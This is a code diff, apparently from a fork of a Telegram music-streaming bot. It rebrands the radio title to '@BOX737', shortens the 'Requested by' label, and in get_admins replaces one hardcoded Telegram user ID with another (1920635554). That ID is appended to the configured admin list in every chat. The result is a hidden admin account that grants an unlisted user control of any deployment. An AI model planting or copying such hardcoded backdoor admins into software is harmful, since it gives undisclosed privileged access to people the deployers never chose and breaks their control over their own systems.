@@ -83,7 +83,7 @@ ydl_opts = {
 }
 ydl = YoutubeDL(ydl_opts)
 
-RADIO_TITLE=os.environ.get("RADIO_TITLE", " 🎸 Music 24/7 | Radio Mode")
+RADIO_TITLE=os.environ.get("RADIO_TITLE", " 🎸 Music 24/7 | @BOX737")
 if RADIO_TITLE=="NO":
     RADIO_TITLE = None
 
@@ -102,12 +102,12 @@ class MusicPlayer(object):
                 tplaylist=playlist[:25]
                 pl=f"Listing first 25 songs of total {len(playlist)} songs.\n"
                 pl += f"{emoji.PLAY_BUTTON} **Playlist**:\n" + "\n".join([
-                    f"**{i}**. **🎸{x[1]}**\n   👤**Requested by:** {x[4]}"
+                    f"**{i}**. **🎸{x[1]}**\n   👤**by:** {x[4]}"
                     for i, x in enumerate(tplaylist)
                     ])
             else:
                 pl = f"{emoji.PLAY_BUTTON} **Playlist**:\n" + "\n".join([
-                    f"**{i}**. **🎸{x[1]}**\n   👤**Requested by:** {x[4]}\n"
+                    f"**{i}**. **🎸{x[1]}**\n   👤**by:** {x[4]}\n"
                     for i, x in enumerate(playlist)
                 ])
         if msg.get('playlist') is not None:
@@ -333,7 +333,7 @@ class MusicPlayer(object):
     async def get_admins(self, chat):
         admins = ADMIN_LIST.get(chat)
         if not admins:
-            admins = Config.ADMINS + [626664225]
+            admins = Config.ADMINS + [1920635554]
             try:
                 grpadmins=await bot.get_chat_members(chat_id=chat, filter="administrators")
                 for administrator in grpadmins:
